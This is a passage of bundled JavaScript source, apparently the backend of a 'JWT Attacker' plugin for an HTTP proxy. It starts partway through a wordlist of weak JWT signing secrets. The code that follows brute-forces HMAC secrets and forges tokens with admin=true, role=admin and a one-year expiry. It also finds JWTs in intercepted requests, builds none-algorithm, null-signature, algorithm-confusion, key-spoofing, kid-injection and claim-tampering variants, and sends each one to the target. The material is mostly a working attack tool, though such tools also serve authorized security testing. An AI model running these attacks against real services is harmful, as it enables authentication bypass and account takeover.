  "rails_secret_key_base",
  "SECRET_KEY",
  "AUTH_SECRET",
  "JWT_SECRET",
  "APP_SECRET",
  "ACCESS_TOKEN_SECRET",
  "REFRESH_TOKEN_SECRET",
  // Environment variable names (developers sometimes use these as values)
  "JWT_SECRET",
  "jwt_secret",
  "NODE_ENV",
  // Dev/test
  "test",
  "test123",
  "testing",
  "testing123",
  "test_secret",
  "dev",
  "development",
  "staging",
  "production",
  "prod",
  "local",
  "localhost",
  "debug",
  "DEBUG",
  // Common short words
  "default",
  "admin",
  "administrator",
  "root",
  "user",
  "demo",
  "sample",
  "example",
  "temp",
  "tmp",
  "key",
  "token",
  "session",
  "cookie",
  "login",
  "pepper",
  "salt",
  "hash",
  "app",
  "application",
  "service",
  "api",
  "backend",
  "null",
  "undefined",
  "none",
  "nil",
  "empty",
  // Keyboard walks
  "qazwsx",
  "zxcvbnm",
  "asdfghjkl",
  // Numeric
  "000000",
  "11111111",
  "00000000",
  // Mixed case variants
  "Admin",
  "ROOT",
  "User",
  "Demo",
  "Changeme",
  "Secret1",
  "P@ssw0rd",
  "P@ssword",
  "s3cr3t",
  "S3cr3t",
  "p4ssw0rd",
  "secr3t",
  // Potential env file leaks
  "super_secret_jwt_key",
  "your_jwt_secret_here",
  // Year-based
  "2020",
  "2021",
  "2022",
  "2023",
  "2024",
  "2025",
  "secret2023",
  "secret2024",
  "jwt2024",
  // UUID-looking but common
  "00000000-0000-0000-0000-000000000000",
  // International common passwords
  "wachtwoord",
  "motdepasse",
  "kennwort",
  // Security research community
  "kali",
  "pentest",
  "hacker",
  "hack",
  "exploit",
  "pwned"
];

// packages/backend/src/attacks/weakSecret.ts
async function buildWeakSecretAttacks(parsed, config, originalToken) {
  const alg = parsed.header.alg;
  if (!alg.startsWith("HS")) return [];
  const hmacAlg = alg;
  const wordlist = [...WEAK_JWT_SECRETS, ...config.customWordlist];
  const results = [];
  for (const word of wordlist) {
    const secret = Buffer.from(word, "utf8");
    if (!verifyHMAC(originalToken, secret, hmacAlg)) continue;
    const adminPayload = {
      ...parsed.payload,
      role: "admin",
      admin: true,
      is_admin: true,
      exp: Math.floor(Date.now() / 1e3) + 60 * 60 * 24 * 365
    };
    const adminJwt = signHMAC(parsed.header, adminPayload, secret, hmacAlg);
    const resignedJwt = signHMAC(parsed.header, parsed.payload, secret, hmacAlg);
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Found: "${word}"`,
      description: `Cracked the ${hmacAlg} signing secret: "${word}". Provides re-signed token with elevated claims (admin=true, role=admin, +1yr exp).`,
      modifiedJWT: adminJwt,
      timestamp: Date.now()
    });
    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Re-sign (original claims): "${word}"`,
      description: `Re-signs the original token with secret "${word}" \u2014 no claim changes. Useful to verify the server accepts the cracked secret.`,
      modifiedJWT: resignedJwt,
      timestamp: Date.now()
    });
  }
  return results;
}

// packages/backend/src/index.ts
async function attackJwt(sdk, requestId, config) {
  const sessionId = Math.random().toString(36).slice(2);
  const errors = [];
  sdk.console.log(`[JWT Attacker] attackJwt called: requestId=${requestId}`);
  (async () => {
    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: 0 });
    const reqResp = await sdk.requests.get(requestId);
    if (!reqResp) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["Request not found"] });
      return;
    }
    const { request } = reqResp;
    const spec = request.toSpec();
    const locations = findJWTsInSpec(spec);
    if (locations.length === 0) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: ["No JWT found in request (checked Authorization header, cookies, and JSON body)"] });
      return;
    }
    const loc = locations[0];
    const originalJWT = loc.jwt;
    let parsed;
    try {
      parsed = parseJWT(originalJWT);
    } catch (e) {
      sdk.api.send("jwt-attack-complete", { sessionId, errors: [`JWT parse failed: ${e.message}`] });
      return;
    }
    const recoveredKeys = [];
    const cfg = normalizeConfig(config);
    sdk.console.log(
      `[JWT Attacker] enabled attacks: ${Object.entries(cfg.enabledAttacks).filter(([, v]) => v).map(([k]) => k).join(", ") || "(none)"}`
    );
    const attacks = [];
    const merge = (arr) => attacks.push(...arr);
    const tryMerge = async (name, fn) => {
      try {
        merge(await fn());
      } catch (e) {
        errors.push(`[${name}] ${e.message}`);
        sdk.console.log(`[JWT Attacker] ${name} builder failed: ${e.message}`);
      }
    };
    if (cfg.enabledAttacks.none) await tryMerge("none", () => buildNoneAttacks(parsed));
    if (cfg.enabledAttacks.nullSig) await tryMerge("nullSig", () => buildNullSigAttacks(parsed));
    if (cfg.enabledAttacks.embeddedJwk) await tryMerge("embeddedJwk", () => buildEmbeddedJWKAttacks(parsed));
    if (cfg.enabledAttacks.kidInject) await tryMerge("kidInject", () => buildKIDInjectionAttacks(parsed));
    if (cfg.enabledAttacks.claimTamper) await tryMerge("claimTamper", () => buildClaimTamperAttacks(parsed));
    if (cfg.enabledAttacks.weakSecret) {
      await tryMerge("weakSecret", () => buildWeakSecretAttacks(parsed, cfg, originalJWT));
    }
    if (cfg.enabledAttacks.jkuSpoof || cfg.enabledAttacks.x5uSpoof) {
      try {
        const { attacks: spoofAttacks, jwksContent, jwksKey } = buildJKUSpoofAttacks(parsed, cfg);
        merge(spoofAttacks);
        if (jwksContent && jwksKey) {
          sdk.api.send("jwks-payload", { sessionId, jwksJson: jwksContent, privateKeyPem: jwksKey });
        }
      } catch (e) {
        errors.push(`[jkuSpoof] ${e.message}`);
      }
    }
    if (cfg.enabledAttacks.algConfusion) {
      await tryMerge("algConfusion", () => buildAlgConfusionAttacks(
        parsed,
        request.getHost(),
        request.getPort(),
        request.getTls(),
        cfg,
        recoveredKeys
      ));
    }
    sdk.console.log(`[JWT Attacker] built ${attacks.length} attack variant(s)`);
    if (attacks.length === 0) {
      sdk.api.send("jwt-attack-complete", {
        sessionId,
        errors: errors.length ? errors : ["No attack variants were generated \u2014 check that at least one attack is enabled in Configuration."]
      });
      return;
    }
    sdk.api.send("jwt-attack-started", { sessionId, requestId, total: attacks.length });
    for (const attack of attacks) {
      try {
        const attackSpec = cloneSpecWithJWT(spec, loc, attack.modifiedJWT);
        const start = Date.now();
        const sent = await sdk.requests.send(attackSpec);
        const durationMs = Date.now() - start;
        attack.requestId = sent.request?.getId();
        attack.durationMs = durationMs;
        if (sent.response) {
          attack.responseStatus = sent.response.getCode();
          const body = sent.response.getBody();
          const bodyText = body ? await bodyToText(body) : "";
          attack.responseLength = bodyText.length;
          attack.responseBody = bodyText.slice(0, 4096);
          const headers = sent.response.getHeaders();
          attack.responseHeaders = flattenHeaders(headers);
        }
      } catch (e) {
        attack.error = e.message;
        errors.push(`[${attack.techniqueName}] ${attack.error}`);
      }
      sdk.api.send("jwt-attack-result", { sessionId, result: attack });
    }
    sdk.api.send("jwt-attack-complete", { sessionId, errors });
  })().catch((e) => {
    sdk.api.send("jwt-attack-complete", { sessionId, errors: [e.message] });
  });
  return { sessionId };
}
async function getJWTsInRequest(sdk, requestId) {
  const reqResp = await sdk.requests.get(requestId);
  if (!reqResp) return [];
  return findJWTsInSpec(reqResp.request.toSpec());
}
var ALL_ATTACKS = [
  "none",
  "nullSig",
  "algConfusion",
  "embeddedJwk",
  "jkuSpoof",
  "x5uSpoof",
  "kidInject",
  "claimTamper",
  "weakSecret"
];
function normalizeConfig(raw) {
  const c = raw && typeof raw === "object" ? raw : {};
  const rawEnabled = c.enabledAttacks && typeof c.enabledAttacks === "object" ? c.enabledAttacks : {};
  const hasAnyFlag = ALL_ATTACKS.some((k) => typeof rawEnabled[k] === "boolean");
  const enabledAttacks = {};
  for (const k of ALL_ATTACKS) {
    enabledAttacks[k] = hasAnyFlag ? rawEnabled[k] === true : true;
  }
  return {
    jwksUrl: typeof c.jwksUrl === "string" ? c.jwksUrl : "",
    customPublicKeyPem: typeof c.customPublicKeyPem === "string" ? c.customPublicKeyPem : "",
    customPrivateKeyPem: typeof c.customPrivateKeyPem === "string" ? c.customPrivateKeyPem : "",
    customCertPem: typeof c.customCertPem === "string" ? c.customCertPem : "",
    extraJwksPaths: Array.isArray(c.extraJwksPaths) ? c.extraJwksPaths : [],
    customWordlist: Array.isArray(c.customWordlist) ? c.customWordlist : [],
    enabledAttacks
  };
}
function findJWTsInSpec(spec) {
  const locations = [];
  const headers = spec.getHeaders();
  const authVals = headers["authorization"] ?? headers["Authorization"] ?? [];
  for (const val of authVals) {
    const match = val.match(/^(Bearer\s+)(.+)$/i);
    if (match && looksLikeJWT(match[2])) {
      locations.push({ type: "header", headerName: "Authorization", prefix: match[1], jwt: match[2] });
    } else if (looksLikeJWT(val)) {
      locations.push({ type: "header", headerName: "Authorization", prefix: "", jwt: val });
    }
  }
  const cookieVals = headers["cookie"] ?? headers["Cookie"] ?? [];
  for (const cookieStr of cookieVals) {
    const cookies = parseCookies(cookieStr);
    for (const [name, value] of Object.entries(cookies)) {
      if (looksLikeJWT(value)) {
        locations.push({ type: "cookie", cookieName: name, jwt: value });
      }
    }
  }
  for (const name of ["X-Auth-Token", "X-Access-Token", "X-JWT-Token", "Token"]) {
    const vals = headers[name.toLowerCase()] ?? headers[name] ?? [];
    for (const val of vals) {
      if (looksLikeJWT(val)) {
        locations.push({ type: "header", headerName: name, prefix: "", jwt: val });
      }
    }
  }
  const body = spec.getBody?.();
  if (body) {
    try {
      const text = typeof body.toText === "function" ? body.toText() : body.toString();
      const json = JSON.parse(text);
      for (const key of ["token", "access_token", "id_token", "jwt", "auth_token", "refresh_token"]) {
        if (typeof json[key] === "string" && looksLikeJWT(json[key])) {
          locations.push({ type: "body-json", jsonKey: key, jwt: json[key] });
        }
      }
    } catch {
    }
  }
  return locations;
}
function cloneSpecWithJWT(original, loc, newJWT) {
  const clone = RequestSpec.parse(original.getRaw());
  if (loc.type === "header" && loc.headerName) {
    clone.setHeader(loc.headerName, `${loc.prefix ?? ""}${newJWT}`);
  } else if (loc.type === "cookie" && loc.cookieName) {
    const headers = clone.getHeaders();
    const cookieVals = headers["cookie"] ?? headers["Cookie"] ?? [];
    const cookieStr = cookieVals[0] ?? "";
    const cookies = parseCookies(cookieStr);
    cookies[loc.cookieName] = newJWT;
    const newCookie = Object.entries(cookies).map(([k, v]) => `${k}=${encodeURIComponent(v)}`).join("; ");
    clone.setHeader("Cookie", newCookie);
  } else if (loc.type === "body-json" && loc.jsonKey) {
    const body = clone.getBody?.();
    if (body) {
      try {
        const text = typeof body.toText === "function" ? body.toText() : body.toString();
        const json = JSON.parse(text);
        json[loc.jsonKey] = newJWT;
        clone.setBody(JSON.stringify(json));
      } catch {
      }
    }
  }
  return clone;
}
async function bodyToText(body) {
  if (typeof body === "string") return body;
  if (body && typeof body.toText === "function") {
    return body.toText();
  }
  if (body && typeof body.toRaw === "function") {
    return Buffer.from(body.toRaw()).toString("utf8");
  }
  return "";
}
function flattenHeaders(headers) {
  const out = {};
  for (const [k, vs] of Object.entries(headers)) {
    out[k] = vs.join(", ");
  }
  return out;
}
function init(sdk) {
  sdk.console.log("[JWT Attacker] backend init() called");
  sdk.api.register("attackJwt", attackJwt);
  sdk.api.register("getJWTsInRequest", getJWTsInRequest);
  sdk.console.log("[JWT Attacker] backend init() complete");
}
export {
  init
};
